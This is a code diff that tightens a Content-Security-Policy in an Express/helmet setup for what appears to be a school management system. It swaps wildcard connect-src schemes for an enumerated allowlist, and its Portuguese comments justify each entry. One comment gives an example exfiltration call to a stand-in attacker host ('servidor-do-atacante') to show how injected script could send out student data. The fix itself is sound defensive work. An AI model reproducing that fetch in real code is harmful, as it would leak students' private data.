@@ -71,22 +71,43 @@ app.use(helmet({
             "font-src": ["'self'", "cdn.jsdelivr.net", "fonts.gstatic.com", "data:"],
             // Google profile photos (lh3.googleusercontent.com) + blobs/data URIs
             "img-src": ["'self'", "data:", "blob:", "https://lh3.googleusercontent.com", "https://lh4.googleusercontent.com", "https://lh5.googleusercontent.com", "https://lh6.googleusercontent.com"],
-            // CRÍTICO: www.googleapis.com é necessário para o fluxo OAuth do Google
             "media-src": ["'self'", "blob:"],
-            // (useGoogleLogin chama /oauth2/v3/userinfo após o popup fechar)
+            // ============================================
+            // connect-src — ALLOWLIST, sem esquemas curinga
+            // ============================================
+            // A lista terminava em `https: http: ws: wss:`, que autoriza QUALQUER
+            // host. Isso reabre justamente o que o resto da CSP fecha: um script
+            // que consiga executar (via `script-src-attr: 'unsafe-inline'`, ainda
+            // aberto para os ~174 handlers legados) podia fazer
+            // `fetch('https://servidor-do-atacante/', {method:'POST', body: ...})`
+            // e drenar nota, frequência e dado de menor sem obstáculo nenhum.
+            // A CSP só vira barreira de EXFILTRAÇÃO quando o destino é enumerado.
+            //
+            // Cada entrada abaixo tem um chamador real no código:
+            //   - onrender.com  → a própria API em produção (HTTP e WebSocket);
+            //   - localhost/127 → dev (Vite, Live Server, socket.io local);
+            //   - viacep        → busca de endereço por CEP no cadastro;
+            //   - *.google*     → OAuth (o portal chama oauth2/www.googleapis);
+            //   - CDNs          → mesmas de `script-src`, que buscam chunks e
+            //                     sourcemaps por fetch.
+            // `data:`/`blob:` ficam: são origens locais ao documento, não dão
+            // saída para a rede.
             "connect-src": [
-                "'self'", 
-                "https://sistema-escolar-bfty.onrender.com", 
-                "http://localhost:*", 
+                "'self'",
+                "https://sistema-escolar-bfty.onrender.com",
+                "wss://sistema-escolar-bfty.onrender.com",
+                "http://localhost:*",
                 "http://127.0.0.1:*",
                 "ws://localhost:*",
                 "ws://127.0.0.1:*",
-                "wss://sistema-escolar-bfty.onrender.com",
-                "cdn.tailwindcss.com",
-                "https:",
-                "http:",
-                "ws:",
-                "wss:",
+                "https://viacep.com.br",
+                "https://accounts.google.com",
+                "https://oauth2.googleapis.com",
+                "https://www.googleapis.com",
+                "https://cdn.jsdelivr.net",
+                "https://cdnjs.cloudflare.com",
+                "https://unpkg.com",
+                "https://cdn.tailwindcss.com",
                 "data:",
                 "blob:"
             ],
